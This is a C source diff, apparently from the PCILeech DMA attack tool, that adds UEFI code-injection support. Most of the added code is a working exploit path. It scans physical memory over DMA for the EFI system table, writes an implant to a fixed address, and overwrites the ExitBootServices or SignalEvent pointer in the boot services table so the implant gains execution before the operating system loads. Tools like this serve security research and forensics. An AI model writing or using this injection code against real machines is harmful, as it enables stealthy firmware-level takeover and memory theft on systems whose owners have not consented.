@@ -561,6 +561,125 @@ BOOL KMD_Win_SearchTableHalpInterruptController(_In_ PBYTE pbPage, _In_ QWORD qw
 	return FALSE;
 }
 
+BOOL KMDOpen_UEFI_FindEfiBase(_Inout_ PPCILEECH_CONTEXT ctx)
+{
+	PBYTE pb;
+	PAGE_STATISTICS ps;
+	DWORD dwAddrCurrent, dwAddrMax, o;
+	QWORD qwAddr_BOOTSERV, qwAddr_RUNTSERV;
+	printf("KMD: Searching for EFI BASE (no -efibase parameter supplied).\n");
+	// initialize & allocate memory
+	pb = LocalAlloc(0, 0x100000);
+	if(!pb) { return FALSE;  }
+	dwAddrCurrent = SIZE_PAGE_ALIGN_4K(ctx->cfg->qwAddrMin);
+	dwAddrMax = max(0xffffffff, SIZE_PAGE_ALIGN_4K(ctx->cfg->qwAddrMax) - 1);
+	PageStatInitialize(&ps, dwAddrCurrent, dwAddrMax, "Searching for EFI BASE", FALSE, FALSE);
+	// loop EFI BASE (IBI SYST) find
+	while(dwAddrCurrent <= dwAddrMax - 0x100000) {
+		if(DeviceReadDMA(ctx, dwAddrCurrent, pb, 0x100000, 0)) {
+			PageStatUpdate(&ps, dwAddrCurrent + 0x100000, 0x100, 0);
+			for(o = 0; o < 0x100000 - 0x100; o += 8) {
+				if(0x5453595320494249 != *(PQWORD)(pb + o)) { continue; } // IBI SYST
+				qwAddr_BOOTSERV = *(PQWORD)(pb + o + 0x60);
+				qwAddr_RUNTSERV = *(PQWORD)(pb + o + 0x58);
+				if((qwAddr_BOOTSERV & 0xffffffff00000007) || (qwAddr_RUNTSERV & 0xffffffff00000007)) { continue; }
+				if(!(qwAddr_BOOTSERV & 0xfffffff8) || !(qwAddr_RUNTSERV & 0xfffffff8)) { continue; }
+				ctx->cfg->qwEFI_IBI_SYST = dwAddrCurrent + o;
+				ps.szAction = "Waiting for KMD to activate";
+				PageStatClose(&ps);
+				LocalFree(pb);
+				return TRUE;
+			}
+		} else {
+			PageStatUpdate(&ps, dwAddrCurrent + 0x100000, 0, 0x100);
+		}
+		dwAddrCurrent += 0x100000;
+	}
+	LocalFree(pb);
+	PageStatClose(&ps);
+	return FALSE;
+}
+
+BOOL KMDOpen_UEFI(_Inout_ PPCILEECH_CONTEXT ctx, _In_ BYTE bOffsetHookBootServices)
+{
+	BOOL result;
+	BYTE pb[0x2000];
+	QWORD qwAddrEFI_BOOTSERV, qwAddrEFI_RUNTSERV, qwAddrHookedFunction;
+	QWORD qwAddrKMDDATA, qwAddrKMD;
+	DWORD cb;
+	qwAddrKMDDATA = 0x38000000;	// Place KMD at a "random" address- Hopefully this works w/o having it overwritten.
+	//------------------------------------------------
+	// 1: Fetch IBI_SYST and BOOTSERV tables
+	//------------------------------------------------
+	if(!ctx->cfg->qwEFI_IBI_SYST) {
+		result = KMDOpen_UEFI_FindEfiBase(ctx);
+		if(!result) {
+			printf("KMD: Failed. EFI system table not found.\n");
+			return FALSE;
+		}
+	}
+	result = DeviceReadDMA(ctx, ctx->cfg->qwEFI_IBI_SYST & ~0xfff, pb, 0x2000, PCILEECH_MEM_FLAG_RETRYONFAIL);
+	result = result && (0x5453595320494249 == *(PQWORD)(pb + (ctx->cfg->qwEFI_IBI_SYST & 0xfff)));
+	qwAddrEFI_BOOTSERV = *(PQWORD)(pb + (ctx->cfg->qwEFI_IBI_SYST & 0xfff) + 0x60);
+	qwAddrEFI_RUNTSERV = *(PQWORD)(pb + (ctx->cfg->qwEFI_IBI_SYST & 0xfff) + 0x58);
+	result = result && qwAddrEFI_RUNTSERV && (0 == (qwAddrEFI_RUNTSERV & 0xffffffff00000007));
+	result = result && qwAddrEFI_BOOTSERV && (0 == (qwAddrEFI_BOOTSERV & 0xffffffff00000007));
+	if(!result) {
+		printf("KMD: Failed. Error reading or interpreting memory #1 at: 0x%llx\n", ctx->cfg->qwEFI_IBI_SYST);
+		return FALSE;
+	}
+	result = DeviceReadDMA(ctx, qwAddrEFI_BOOTSERV & ~0xfff, pb, 0x2000, PCILEECH_MEM_FLAG_RETRYONFAIL);
+	result = result && (0x56524553544f4f42 == *(PQWORD)(pb + (qwAddrEFI_BOOTSERV & 0xfff)));
+	qwAddrHookedFunction = *(PQWORD)(pb + (qwAddrEFI_BOOTSERV & 0xfff) + bOffsetHookBootServices);
+	result = result && qwAddrHookedFunction && (0 == (qwAddrHookedFunction & 0xffffffff00000000));
+	if(!result) {
+		printf("KMD: Failed. Error reading or interpreting memory #2 at: 0x%llx :: 0x%llx\n", ctx->cfg->qwEFI_IBI_SYST, qwAddrEFI_BOOTSERV);
+		return FALSE;
+	}
+	//------------------------------------------------
+	// 2: Prepare Patch
+	//------------------------------------------------
+	memset(pb, 0, 0x2000);
+	Util_ParseHexFileBuiltin("DEFAULT_UEFI_X64", pb + 0x1000, 0x1000, &cb);
+	*(PDWORD)(pb + 0x1004) = (DWORD)ctx->cfg->qwEFI_IBI_SYST;
+	*(PDWORD)(pb + 0x1008) = (DWORD)(qwAddrEFI_BOOTSERV + bOffsetHookBootServices);
+	*(PDWORD)(pb + 0x100C) = (DWORD)qwAddrHookedFunction;
+	//------------------------------------------------
+	// 3: Patch
+	//------------------------------------------------
+	if(ctx->cfg->fVerbose) {
+		printf("INFO: IBI SYST:   0x%08x\n", ctx->cfg->qwEFI_IBI_SYST);
+		printf("INFO: BOOTSERV:   0x%08x\n", qwAddrEFI_BOOTSERV);
+	}
+	result = DeviceWriteDMA(ctx, qwAddrKMDDATA, pb, 0x2000, PCILEECH_MEM_FLAG_RETRYONFAIL);
+	if(!result) {
+		printf("KMD: Failed. Failed writing to memory #1.\n");
+		return FALSE;
+	}
+	qwAddrKMD = qwAddrKMDDATA + 0x1000;
+	result = DeviceWriteDMA(ctx, qwAddrEFI_BOOTSERV + bOffsetHookBootServices, (PBYTE)&qwAddrKMD, 8, PCILEECH_MEM_FLAG_RETRYONFAIL);
+	if(!result) {
+		printf("KMD: Failed. Failed writing to memory #2.\n");
+		return FALSE;
+	}
+	//------------------------------------------------
+	// 4: Wait for execution
+	//------------------------------------------------
+	printf("KMD: Waiting to receive execution.\n");
+	do {
+		Sleep(100);
+		if(!DeviceReadDMA(ctx, qwAddrKMDDATA, pb, 0x1000, PCILEECH_MEM_FLAG_RETRYONFAIL)) {
+			printf("KMD: Failed. DMA Read failed while waiting to receive physical address.\n");
+			return FALSE;
+		}
+	} while(KMDDATA_MAGIC != *(PQWORD)pb);
+	//------------------------------------------------
+	// 5: Retrieve Memory Map
+	// (ugly to issue a 2nd unnecessary DMA write, but works to reuse code) 
+	//------------------------------------------------
+	return KMD_SetupStage3(ctx, (DWORD)qwAddrKMDDATA, pb + 0x1000, 0x1000);
+}
+
 // https://blog.coresecurity.com/2016/08/25/getting-physical-extreme-abuse-of-intel-based-paging-systems-part-3-windows-hals-heap/
 // HAL is statically located at: ffffffffffd00000 (win8.1/win10 pre 1703)
 // HAL is randomized between: fffff78000000000:fffff7ffc0000000 (win10 1703) [512 possible positions in PDPT]
@@ -691,8 +810,8 @@ BOOL KMD_SubmitCommand(_Inout_ PPCILEECH_CONTEXT ctx, _In_ QWORD op)
 			Exec_CallbackClose(hCallback);
 			return FALSE;
 		}
-		if((op != KMD_CMD_MEM_INFO) && (ctx->pk->MAGIC != KMDDATA_MAGIC) && (ctx->pk->MAGIC != KMDDATA_MAGIC_PARTIAL)) {
-			printf("PCILEECH: FAIL: KMDDATA corruption! - bit errors? Address: %08x. Terminating.\n", ctx->phKMD->dwPageAddr32);
+		if((op != KMD_CMD_TERMINATE) && (op != KMD_CMD_MEM_INFO) && (ctx->pk->MAGIC != KMDDATA_MAGIC) && (ctx->pk->MAGIC != KMDDATA_MAGIC_PARTIAL)) {
+			printf("PCILEECH: FAIL: KMDDATA corruption! - bit errors? Address: 0x%08x. Terminating.\n", ctx->phKMD->dwPageAddr32);
 			DeviceClose(ctx);
 			ExitProcess(0);
 		}
@@ -1128,6 +1247,10 @@ BOOL KMDOpen(_Inout_ PPCILEECH_CONTEXT ctx)
 		return KMDOpen_HalHijack(ctx);
 	} else if(0 == _stricmp(ctx->cfg->szKMDName, "LINUX_X64_EFI")) {
 		return KMDOpen_LinuxEfiRuntimeServicesHijack(ctx);
+	} else if(0 == _stricmp(ctx->cfg->szKMDName, "UEFI_EXIT_BOOT_SERVICES")) {
+		return KMDOpen_UEFI(ctx, 0xe8 /* ExitBootServices */);
+	} else if(0 == _stricmp(ctx->cfg->szKMDName, "UEFI_SIGNAL_EVENT")) {
+		return KMDOpen_UEFI(ctx, 0x68 /* ??? */);
 	} else {
 		return KMDOpen_MemoryScan(ctx);
 	}
